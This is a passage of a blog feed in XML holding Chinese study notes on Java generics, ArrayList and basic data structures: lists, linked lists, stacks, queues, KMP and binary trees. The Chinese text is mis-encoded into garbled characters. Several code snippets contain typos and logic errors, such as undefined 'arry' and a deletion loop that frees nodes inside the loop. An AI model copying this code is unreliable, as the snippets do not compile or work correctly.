class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                                             </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Alg</span> <span class="variable">alg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Alg</span>();</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                 </span><br></pre></td></tr></table></figure><p><strong>é™æ€</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                                             </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> Alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;       </span><br></pre></td></tr></table></figure><h3 id="Listæ¥å£"><a href="#Listæ¥å£" class="headerlink" title="Listæ¥å£"></a>Listæ¥å£</h3><p>ç»§æ‰¿Collection Collectionç»§æ‰¿äºIterable</p><p>çº¿æ€§è¡¨ nä¸ªå…·æœ‰ç›¸åŒç±»å‹å…ƒç´ çš„æœ‰é™åºåˆ— åœ¨è¯¥åºåˆ—ä¸Šé¢å¯ä»¥æ‰§è¡Œå¢åˆ æ”¹æŸ¥ä»¥åŠå˜é‡ç­‰æ“ä½œ</p><p><strong>Listæ˜¯ä¸ªæ¥å£ ä¸èƒ½ç”¨æ¥å®ä¾‹åŒ– åœ¨é›†åˆæ¡†æ¶ä¸­ ArrayListå’ŒLinkedListéƒ½å®ç°äº†Listæ¥å£</strong><br>equals  è¿”å›å€¼true&#x2F;false<br>compareto æ¯”è¾ƒå¤§äºå°äºç­‰äº</p><p>æ•°ç»„ä¸­çš„å¼•ç”¨ç±»å‹éœ€è¦é€ä¸ªæ»ç©º</p><h5 id="ArrayListçš„ç”¨æ³•"><a href="#ArrayListçš„ç”¨æ³•" class="headerlink" title="ArrayListçš„ç”¨æ³•"></a>ArrayListçš„ç”¨æ³•</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//è°ƒç”¨çš„æ–¹æ³•æ›´å¤š </span></span><br><span class="line">   List&lt;Integer&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  <span class="comment">// ä¸€ä¸ªæ¥å£å¼•ç”¨ä¸€ä¸ªå…·ä½“çš„å®ç°ç±» å¯ä»¥å‘ç”Ÿå‘ä¸Šè½¬å‹ä½†åªèƒ½è°ƒç”¨Listæ¥å£ç±»æ–¹æ³•</span></span><br><span class="line">  list2.add(<span class="number">1</span>);<span class="comment">//é»˜è®¤æ”¾åˆ°æ•°ç»„æœ€åä¸€ä¸ªä½ç½® é»˜è®¤++</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.ArrayLIistæ˜¯ä»¥æ³›å‹çš„æ–¹å¼å®ç°çš„ ä½¿ç”¨æ—¶å¿…é¡»å…ˆå®ä¾‹åŒ–<br>2.ArrayListå®ç°äº†RandomAccessæ¥å£ è¡¨æ˜ArrayListæ”¯æŒéšæœºè®¿é—®<br>3.ArrayListå®ç°äº†Cloneableæ¥å£ è¡¨æ˜ArrayListæ”¯æŒåºåˆ—åŒ–<br>4.ArrayListå®ç°äº†Serializableæ¥å£ï¼Œè¡¨æ˜ArrayListæ˜¯æ”¯æŒåºåˆ—åŒ–çš„<br>5.å’ŒVectorä¸åŒ ArrayListä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ åœ¨å•çº¿ç¨‹ä¸‹å¯ä»¥ä½¿ç”¨  åœ¨å¤šçº¿ç¨‹ä¸­å¯ä»¥é€‰æ‹©Vectoræˆ–è€…CopyOnWriteArrayList<br>6.ArrayListåº•å±‚æ˜¯ä¸€æ®µè¿ç»­çš„ç©ºé—´ å¯ä»¥åŠ¨æ€æ‰©å®¹ æ˜¯ä¸€ä¸ªåŠ¨æ€ç±»å‹çš„é¡ºåºè¡¨</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®ç»“æ„</title>
      <link href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/"/>
      <url>/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•°æ®ç»“æ„ç¢ç‰‡"><a href="#æ•°æ®ç»“æ„ç¢ç‰‡" class="headerlink" title="æ•°æ®ç»“æ„ç¢ç‰‡"></a>æ•°æ®ç»“æ„ç¢ç‰‡</h2><h5 id="ä¸€å…ƒå¤šé¡¹å¼"><a href="#ä¸€å…ƒå¤šé¡¹å¼" class="headerlink" title="ä¸€å…ƒå¤šé¡¹å¼"></a>ä¸€å…ƒå¤šé¡¹å¼</h5><p>ç®€å•æ•°ç»„è¡¨ç¤º å­˜å‚¨ç³»æ•°å’ŒæŒ‡æ•°ï¼Œä¸€ä¸€å¯¹åº”ï¼Œè¿ç®—å³åˆ†ç±»æ“ä½œæ—¢å¯<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231123131613823.png" alt="image-20231123131613823"></p><h5 id="ç¨€ç–å¤šé¡¹å¼"><a href="#ç¨€ç–å¤šé¡¹å¼" class="headerlink" title="ç¨€ç–å¤šé¡¹å¼"></a>ç¨€ç–å¤šé¡¹å¼</h5><p> è®°å½•ç³»æ•°ä¸ä¸ºé›¶çš„é¡¹ æ¯ä¸€é¡¹çš„ç³»æ•°å’ŒæŒ‡æ•°ä¹Ÿæ„æˆçº¿æ€§è¡¨ï¼ˆå…ˆç³»æ•°å†æŒ‡æ•°ï¼‰</p><p><strong>ç¨€ç–å¤šé¡¹å¼çš„è¿ç®—</strong></p><p>æ–°å¼€è®¾æ–°æ•°ç»„Cï¼ˆç¬¬ä¸‰ä¸ªæ•°ç»„ç›¸å½“äºä¸­é—´å­˜å‚¨ï¼‰ </p><p>ä»å¤´å¼€å§‹éå†æ¯”è¾ƒaå’Œbçš„æ¯ä¸€é¡¹<br>æŒ‡æ•°ç›¸åŒ å¯¹åº”ç³»æ•°ç›¸åŠ ï¼Œå’Œä¸ä¸º0ï¼ŒCä¸­æ–°å¢åŠ æ–°é¡¹;å’Œä¸º0ï¼Œå»æ‰ å³å¯</p><p>æŒ‡æ•°ä¸ç›¸åŒï¼Œå°†æŒ‡æ•°è¾ƒå°çš„é¡¹å¤åˆ¶åˆ°Cä¸­</p><p><u>ä¸€ä¸ªå¤šé¡¹å¼å·²éå†å®Œæ¯•æ—¶ï¼Œå°†å¦ä¸€ä¸ªå‰©ä½™é¡¹ä¾æ¬¡å¤åˆ¶åˆ°Cä¸­å³å¯ </u></p><p><strong>é¡ºåºå­˜å‚¨å­˜åœ¨çš„é—®é¢˜</strong></p><p>1.å­˜å‚¨ç©ºé—´åˆ†é…ä¸çµæ´»<br>2.è¿ç®—çš„ç©ºé—´å¤æ‚åº¦é«˜</p><h5 id="é“¾å¼å­˜å‚¨è§£å†³ç¨€ç–å¤šé¡¹å¼"><a href="#é“¾å¼å­˜å‚¨è§£å†³ç¨€ç–å¤šé¡¹å¼" class="headerlink" title="é“¾å¼å­˜å‚¨è§£å†³ç¨€ç–å¤šé¡¹å¼"></a>é“¾å¼å­˜å‚¨è§£å†³ç¨€ç–å¤šé¡¹å¼</h5><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231123132146214.png" alt="image-20231123132146214"></p><h5 id="çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ çš„ç±»å‹å¯ä»¥æ˜¯ç®€å•-å¤æ‚ç±»å‹"><a href="#çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ çš„ç±»å‹å¯ä»¥æ˜¯ç®€å•-å¤æ‚ç±»å‹" class="headerlink" title="çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ çš„ç±»å‹å¯ä»¥æ˜¯ç®€å•&#x2F;å¤æ‚ç±»å‹"></a><strong>çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ çš„ç±»å‹å¯ä»¥æ˜¯ç®€å•&#x2F;å¤æ‚ç±»å‹</strong></h5><h3 id="çº¿æ€§è¡¨çš„å®šä¹‰ç±»å‹"><a href="#çº¿æ€§è¡¨çš„å®šä¹‰ç±»å‹" class="headerlink" title="çº¿æ€§è¡¨çš„å®šä¹‰ç±»å‹"></a>çº¿æ€§è¡¨çš„å®šä¹‰ç±»å‹</h3><h5 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h5><p>InitList(&amp;L)<br>æ“ä½œç»“æœï¼šæ„é€ ä¸€ä¸ªç©ºé“¾è¡¨</p><p>DestroyList(&amp;L)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨Lå·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šé”€æ¯çº¿æ€§è¡¨L</p><p>ClearList(&amp;L)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨Lå·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šå°†çº¿æ€§è¡¨Lé‡ç½®ä¸ºç©ºè¡¨</p><p>ListEmpty(L)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨å·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šè‹¥Lä¸ºç©ºè¿”å›TRUE,å¦åˆ™è¿”å›FALSE</p><p>ListLength(L)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨å·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šè¿”å›Lä¸­æ•°æ®å…ƒç´ ä¸ªæ•°</p><p>GetElem(L,i,&amp;e)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨Lå·²ç»å­˜åœ¨ï¼Œ1&lt;&#x3D;i&lt;&#x3D;ListLength(L)<br>æ“ä½œç»“æœï¼š ç”¨eè¿”å›çº¿æ€§è¡¨Lä¸­ç¬¬iä¸ªæ•°æ®çš„å€¼</p><p>LocateElemï¼ˆLï¼Œeï¼Œcompareï¼ˆï¼‰ï¼‰<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨Lå·²ç»å­˜åœ¨ï¼Œcompareï¼ˆï¼‰æ˜¯æ•°æ®å…ƒç´ åˆ¤å®šå‡½æ•°<br>æ“ä½œç»“æœï¼šè¿”å›Lä¸­ç¬¬1ä¸ªä¸eæ»¡è¶³compareï¼ˆï¼‰çš„æ•°æ®å…ƒç´ çš„ä½åºã€‚å¦‚ä¸å­˜åœ¨è¿™æ ·çš„æ•°æ®å…ƒç´ åˆ™è¿”å›0.  </p><p>PriorElem(L,cur_e,&amp;pre_e)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨Lå·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šè‹¥cur_eæ˜¯Lçš„æ•°æ®å…ƒç´ ä¸”ä¸æ˜¯ç¬¬ä¸€ä¸ªï¼Œåˆ™ç”¨pre_eè¿”å›å®ƒçš„å‰é©±å¦åˆ™æ“ä½œå¤±è´¥ï¼Œpre_eæ— æ„ä¹‰</p><p>NextElem(L,cur_e,&amp;next_e)<br>åˆå§‹æ¡ä»¶ï¼šçº¿æ€§è¡¨Lå·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šè‹¥cur_eæ˜¯Lçš„æ•°æ®å…ƒç´ ä¸”ä¸æ˜¯æœ€åä¸€ä¸ªï¼Œåˆ™ç”¨next_eè¿”å›å®ƒçš„å‰é©±å¦åˆ™æ“ä½œå¤±è´¥ï¼Œnext_eæ— æ„ä¹‰</p><p>ListInsert(&amp;L,i,e)<br>åˆå§‹æ¡ä»¶ï¼šLå·²å­˜åœ¨ï¼Œ1&lt;&#x3D;i&lt;&#x3D;ListLength(L)+1<br>æ“ä½œç»“æœï¼šåœ¨Lçš„ç¬¬iä¸ªä½ç½®æ’å…¥æ–°çš„å…ƒç´ eï¼ŒLé•¿åº¦+1<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231127113252697.png" alt="image-20231127113252697"></p><p>ListDelete(&amp;L,i,e)<br>åˆå§‹æ¡ä»¶ï¼šLå·²ç»å­˜åœ¨ï¼Œ1&lt;&#x3D;i&lt;&#x3D;ListLength(L)<br>æ“ä½œç»“æœï¼šåˆ é™¤Lçš„ç¬¬iä¸ªæ•°æ®ï¼Œå¹¶ç”¨eè¿”å›å…¶å€¼ï¼ŒLé•¿åº¦-1</p><p>ListTraverse(&amp;L,visited())<br>åˆå§‹æ¡ä»¶ï¼šLå·²ç»å­˜åœ¨<br>æ“ä½œç»“æœï¼šä¾æ¬¡å¯¹çº¿æ€§è¡¨ä¸­æ¯ä¸ªå…ƒç´ è°ƒç”¨visitedï¼ˆï¼‰</p><p><strong>æŠ½è±¡æ•°æ®ç±»å‹çº¿æ€§è¡¨çš„å®šä¹‰</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231204104700401.png" alt="image-20231204104700401"></p><h4 id="çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„"><a href="#çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„" class="headerlink" title="çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„"></a>çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„</h4><p><strong>å…¸ä¾‹ï¼šä¸€ç»´æ•°ç»„</strong></p><p>å®šä¹‰ï¼šæŠŠé€»è¾‘ä¸Šç›¸é‚»çš„æ•°æ®å…ƒç´ å­˜å‚¨åœ¨ç‰©ç†ç›¸é‚»çš„å­˜å‚¨å•å…ƒä¸­çš„å­˜å‚¨ç»“æ„ã€‚<br><strong>å ç”¨ä¸€å—è¿ç»­çš„å­˜å‚¨ç©ºé—´æ–¹ä¾¿è®¡ç®—å¾—å‡ºå…¶ä»–å…ƒç´ çš„å­˜å‚¨ä½ç½®</strong><br><u>locï¼ˆaiï¼‰&#x3D;locï¼ˆa1ï¼‰+ï¼ˆi-1ï¼‰</u>Ã—lï¼ˆå­˜å‚¨å•å…ƒé•¿åº¦ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIST _INIT_SIZE 100<span class="comment">//çº¿æ€§å­˜å‚¨ç©ºé—´çš„åˆå§‹åˆ†é…é‡</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> ElemType elem[LIST_INIT_SIZE];</span><br><span class="line"> <span class="type">int</span> length;<span class="comment">//å½“å‰é•¿åº¦</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h3 id="æ•°ç»„æ¨¡æ‹Ÿå•é“¾è¡¨"><a href="#æ•°ç»„æ¨¡æ‹Ÿå•é“¾è¡¨" class="headerlink" title="æ•°ç»„æ¨¡æ‹Ÿå•é“¾è¡¨"></a>æ•°ç»„æ¨¡æ‹Ÿå•é“¾è¡¨</h3><p>é‚»æ¥è¡¨ï¼ˆæœ€å¸¸ç”¨ï¼‰<br>å­˜å‚¨å›¾å’Œæ ‘<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230911185245253.png" alt="image-20230911185245253"></p><p>ç©ºèŠ‚ç‚¹ä¸‹æ ‡ç”¨-1è¡¨ç¤º<br>è”é‚¦æ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨ä¸¤ä¸ªå€¼ï¼šå†…å®¹å’ŒæŒ‡å‘ä¸‹ä¸€èŠ‚ç‚¹æŒ‡é’ˆ</p><h4 id="é¡ºåºè¡¨çš„æ’å…¥"><a href="#é¡ºåºè¡¨çš„æ’å…¥" class="headerlink" title="é¡ºåºè¡¨çš„æ’å…¥"></a>é¡ºåºè¡¨çš„æ’å…¥</h4><p>ä¸‰æ­¥éª¤ï¼š<br>ä»åå¾€å‰èµ‹å€¼<br>å¯¹ç›®æ ‡ä½ç½®è¿›è¡Œèµ‹å€¼<br>åˆ—è¡¨é•¿åº¦+1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = L.length;j&gt;=i;j--)<span class="comment">//è®©j=å½“å‰åˆ—è¡¨é•¿åº¦ï¼Œiåçš„æ•°æ®ä¾æ¬¡åç§»</span></span><br><span class="line">&#123;</span><br><span class="line">L.data[j] = L.data[j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">L.data[i<span class="number">-1</span>] = e;<span class="comment">//è®©ç¬¬iä¸ªæ•°=eï¼Œä½†æ•°ç»„ä¸‹æ ‡-</span></span><br><span class="line">L.length++;<span class="comment">//æ’å…¥ä¸€ä¸ªåï¼Œè¡¨çš„åŸæœ‰é•¿åº¦+1</span></span><br></pre></td></tr></table></figure><h4 id="é¡ºåºè¡¨çš„åˆ é™¤"><a href="#é¡ºåºè¡¨çš„åˆ é™¤" class="headerlink" title="é¡ºåºè¡¨çš„åˆ é™¤"></a>é¡ºåºè¡¨çš„åˆ é™¤</h4><p>ä¸‰æ­¥éª¤ï¼š<br>è¢«åˆ é™¤çš„ç›®æ ‡å…ƒç´ èµ‹å€¼ç»™e<br>æŠŠç¬¬iä¸ªä½ç½®çš„å…ƒç´ å‰ç§»<br>åˆ—è¡¨é•¿åº¦-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = L.data[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = i;j&lt;L.length;j++)&#123;</span><br><span class="line">L.data[j<span class="number">-1</span>] = L.data[j];</span><br><span class="line">&#125;</span><br><span class="line">L.length--;</span><br></pre></td></tr></table></figure><h4 id="å•é“¾è¡¨çš„å¤´æ’æ³•ï¼ˆé€†åºï¼‰å’Œå°¾æ’æ³•ï¼ˆæ­£åºï¼‰"><a href="#å•é“¾è¡¨çš„å¤´æ’æ³•ï¼ˆé€†åºï¼‰å’Œå°¾æ’æ³•ï¼ˆæ­£åºï¼‰" class="headerlink" title="å•é“¾è¡¨çš„å¤´æ’æ³•ï¼ˆé€†åºï¼‰å’Œå°¾æ’æ³•ï¼ˆæ­£åºï¼‰"></a>å•é“¾è¡¨çš„å¤´æ’æ³•ï¼ˆé€†åºï¼‰å’Œå°¾æ’æ³•ï¼ˆæ­£åºï¼‰</h4><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231224235713856.png" alt="image-20231224235713856"></p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231224235737641.png" alt="image-20231224235737641"></p><h4 id="å•é“¾è¡¨çš„åˆ é™¤"><a href="#å•é“¾è¡¨çš„åˆ é™¤" class="headerlink" title="å•é“¾è¡¨çš„åˆ é™¤"></a>å•é“¾è¡¨çš„åˆ é™¤</h4><p>1.æ‰¾ç‚¹è¦åˆ é™¤å•é“¾è¡¨çš„çˆ¶èŠ‚ç‚¹<br>2.å¾…åˆ é™¤èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹&#x3D;å¾…åˆ é™¤èŠ‚ç‚¹çš„å­—èŠ‚ç‚¹<br>3.é‡Šæ”¾èŠ‚ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225105201271.png" alt="image-20231225105201271"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Node prev = dummyHead;<span class="comment">//æŒ‡å‘å¤´èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">for</span>ï¼ˆ<span class="type">int</span> i = <span class="number">0</span>;i &lt; index; i++ï¼‰&#123;</span><br><span class="line">prev = pev.next;</span><br><span class="line">NodeHead retNode = prev.next;<span class="comment">//retNodeä¸ºå¾…åˆ é™¤èŠ‚ç‚¹</span></span><br><span class="line">prev.next = retNode.next;<span class="comment">//åˆ é™¤èŠ‚ç‚¹</span></span><br><span class="line"><span class="built_in">free</span>(retNode);<span class="comment">//é‡Šæ”¾èŠ‚ç‚¹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒå‘é“¾è¡¨çš„æ’å…¥å’Œåˆ é™¤"><a href="#åŒå‘é“¾è¡¨çš„æ’å…¥å’Œåˆ é™¤" class="headerlink" title="åŒå‘é“¾è¡¨çš„æ’å…¥å’Œåˆ é™¤"></a>åŒå‘é“¾è¡¨çš„æ’å…¥å’Œåˆ é™¤</h3><p>1.æ’å…¥<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225105902718.png" alt="image-20231225105902718"></p><p>pèŠ‚ç‚¹ä¿ç•™ç›¸åº”ä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110235205.png" alt="image-20231225110235205"></p><h3 id="å…¥æ ˆå’Œå‡ºæ ˆ"><a href="#å…¥æ ˆå’Œå‡ºæ ˆ" class="headerlink" title="å…¥æ ˆå’Œå‡ºæ ˆ"></a>å…¥æ ˆå’Œå‡ºæ ˆ</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110728355.png" alt="image-20231225110728355"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110638880.png" alt="image-20231225110638880"></p><h4 id="é˜Ÿåˆ—çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿ"><a href="#é˜Ÿåˆ—çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿ" class="headerlink" title="é˜Ÿåˆ—çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿ"></a>é˜Ÿåˆ—çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿ</h4><p>é˜Ÿåˆ—ç‰¹ç‚¹ï¼šå…ˆè¿›å…ˆå‡º<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231226105602978.png" alt="image-20231226105602978"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231226105828912.png" alt="image-20231226105828912"></p><h4 id="nextæ•°ç»„æ±‚è§£"><a href="#nextæ•°ç»„æ±‚è§£" class="headerlink" title="nextæ•°ç»„æ±‚è§£"></a>nextæ•°ç»„æ±‚è§£</h4><p>KMPç®—æ³•</p><p>next[i] &#x3D; æœ€è¿‘åŒ¹é…å­—ç¬¦ä¸ªæ•°+1<br>æ­£å¸¸ç¬¬ä¸€ä½æ•°ä»0å¼€å§‹<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/QQ%E6%88%AA%E5%9B%BE20231227093954.png" alt="QQæˆªå›¾20231227093954"></p><h4 id="nextvalæ•°ç»„æ±‚è§£"><a href="#nextvalæ•°ç»„æ±‚è§£" class="headerlink" title="nextvalæ•°ç»„æ±‚è§£"></a>nextvalæ•°ç»„æ±‚è§£</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094200599.png" alt="image-20231227094200599"></p><h4 id="æ ‘èŠ‚ç‚¹çš„è®¡ç®—"><a href="#æ ‘èŠ‚ç‚¹çš„è®¡ç®—" class="headerlink" title="æ ‘èŠ‚ç‚¹çš„è®¡ç®—"></a>æ ‘èŠ‚ç‚¹çš„è®¡ç®—</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094234032.png" alt="image-20231227094234032"></p><p>æ ‘æ€»ç»“ç‚¹N &#x3D; åº¦æ•°âœ–å¯¹åº”æ¥èŠ‚ç‚¹ä¸ªæ•°+1ï¼ˆæ ¹èŠ‚ç‚¹ï¼‰<br>ä¸Šå›¾N &#x3D; 3a+2b+c+1 &#x3D; a+b+c+1<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094253091.png" alt="image-20231227094253091"></p><h4 id="æ»¡äºŒå‰æ ‘å’Œå®Œå…¨äºŒå‰æ ‘"><a href="#æ»¡äºŒå‰æ ‘å’Œå®Œå…¨äºŒå‰æ ‘" class="headerlink" title="æ»¡äºŒå‰æ ‘å’Œå®Œå…¨äºŒå‰æ ‘"></a>æ»¡äºŒå‰æ ‘å’Œå®Œå…¨äºŒå‰æ ‘</h4><h5 id="æ»¡äºŒå‰æ ‘"><a href="#æ»¡äºŒå‰æ ‘" class="headerlink" title="æ»¡äºŒå‰æ ‘"></a>æ»¡äºŒå‰æ ‘</h5><p><strong>å®šä¹‰</strong><br>ä¸€é¢—æ·±åº¦ä¸ºkä¸”æœ‰2^k-1ä¸ªç»“ç‚¹çš„äºŒå‰æ ‘.<br><strong>ç‰¹ç‚¹</strong><br>1.æ¯å±‚éƒ½æ˜¯æ»¡çš„<br>2.åªæœ‰åº¦ä¸º0å’Œ2çš„èŠ‚ç‚¹<br>3.å«nä¸ªç»“ç‚¹çš„æ»¡äºŒå‰æ ‘é«˜åº¦ä¸ºlog2(n+1)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094617607.png" alt="image-20231227094617607"></p><h5 id="å®Œå…¨äºŒå‰æ ‘"><a href="#å®Œå…¨äºŒå‰æ ‘" class="headerlink" title="å®Œå…¨äºŒå‰æ ‘"></a>å®Œå…¨äºŒå‰æ ‘</h5><p><strong>å®šä¹‰</strong><br>æ·±åº¦ä¸ºkå…·æœ‰nä¸ªç»“ç‚¹çš„äºŒå‰æ ‘ï¼Œå½“ä¸”ä»…å½“å…¶æ¯ä¸€ä¸ªç»“ç‚¹éƒ½ä¸æ·±åº¦ä¸ºkçš„æ»¡äºŒå‰æ 